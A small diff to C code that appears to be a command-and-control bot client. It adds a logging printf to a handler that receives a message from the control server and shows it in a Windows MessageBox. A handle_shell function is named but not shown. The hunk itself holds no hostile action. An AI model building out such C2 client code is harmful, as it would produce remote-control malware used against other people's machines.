@@ -24,6 +24,7 @@ void handle_shell() {
 void handle_msgbox() {
   char *msg;
   msg = recvfromcnc(MSGBOX_BUFSIZE);
+  printf("Popping MessageBox: %s", msg);
   MessageBox(NULL, msg, "Gengar Says", 0);
   free(msg);
 }
